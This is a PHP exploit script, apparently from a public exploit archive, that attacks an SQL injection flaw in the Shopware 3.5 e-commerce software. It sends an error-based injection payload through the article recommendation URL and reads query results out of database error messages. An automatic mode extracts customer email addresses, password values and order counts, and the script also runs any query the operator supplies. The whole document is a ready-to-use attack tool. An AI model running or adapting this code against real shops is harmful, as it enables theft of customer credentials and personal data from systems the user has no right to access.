#!/usr/bin/php
<?php

#  Exploit Title: Shopware 3.5 - SQL Injection
#  Date: 13.07.2012
#  Exploit Author: Kataklysmos
#  Software Link: http://www.shopware.de/
#  Version: 3.5


function http_req($host, $q)
{
  if(!$fs = fsockopen($host, 80))
    exit("Could not open HTTP- Connection to ".$host."\r\n\r\n");
  
  $head  = "GET /recommendation/bought/article/".urlencode("0 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT (".$q.") FROM `information_schema`.`tables` LIMIT 0,1), FLOOR(RAND(0)*2)) x FROM `information_schema`.`tables` GROUP BY x) z)")." HTTP/1.1\r\n";
  $head .= "Host: ".$host."\r\n";
  $head .= "Connection: Close\r\n\r\n";
  
  fwrite($fs, $head);
  
  $ret = '';
  while(!feof($fs))
    $ret .= fgets($fs, 4096);
  fclose($fs);
  
  return $ret;
}

function mask($cont)
{
  if(preg_match('/Duplicate entry \'(.*)1\' for/', $cont, $m))
    return $m[1];
  else
    return false;
}

function space($x)
{
  $r = '';
  for($i = 0; $i < $x; $i++)
    $r .= ' ';
  return $r;
}

echo "\r\nExploit Title: Shopware 3.5 - SQL Injection\r\n";
echo "Date: 13.07.2012\r\n";
echo "Exploit Author: Kataklysmos\r\n";
echo "Software Link: http://www.shopware.de/\r\n";
echo "Version: 3.5\r\n\r\n";

if(!isset($argv[2]))
{
  echo "  Usage: \r\n";
  echo "  ".$argv[0]." HOST --auto\r\n";
  echo "  ".$argv[0]." www.shopwaredemo.de --auto\r\n\r\n";
  echo "  ".$argv[0]." HOST QUERY\r\n";
  echo "  ".$argv[0]." www.shopwaredemo.de \"SELECT COUNT(`id`) FROM `s_user`\"\r\n";
  echo "  ".$argv[0]." www.shopwaredemo.de \"SELECT `email` FROM `s_user` LIMIT 0,1\"\r\n\r\n";
  exit(1);
}

if($argv[2] != '--auto')
{
  $x = http_req($argv[1], $argv[2]);

  if(!$x = mask($x))
    exit("Your query failed!\r\n\r\n");

  echo "Query:\r\n  ".$argv[2]."\r\nReturn:\r\n  ".$x."\r\n\r\n";
}
else
{
  $task = array(array('Amount of registered users', 'SELECT COUNT(`id`) FROM `s_user`', null),
                array('E- Mail from first user', 'SELECT `email` FROM `s_user` ORDER BY `id` LIMIT 0,1', null),
                array('Password from first user', 'SELECT `password` FROM `s_user` LIMIT 0,1', null),
                array('Amount of orders', 'SELECT COUNT(`id`) FROM `s_order`', null)
                );
  
  for($i = 0; $i < count($task); $i++)
  {
    echo "[ .. ] Task: \"".$task[$i][0]."\"";
    
    $x = http_req($argv[1], $task[$i][1]);
    if(!$x = mask($x))
      echo "\r[fail] Task: \"".$task[$i][0]."\"\r\n";
    else
    {
      echo "\r[ ok ] Task: \"".$task[$i][0]."\"\r\n";
      $task[$i][2] = $x;
    }
  }
  echo "\r\n";
  
  for($i = 0; $i < count($task); $i++)
    echo $task[$i][0].space(26-strlen($task[$i][0])).' : '.$task[$i][2]."\r\n";
  
  echo "\r\n";
}

?>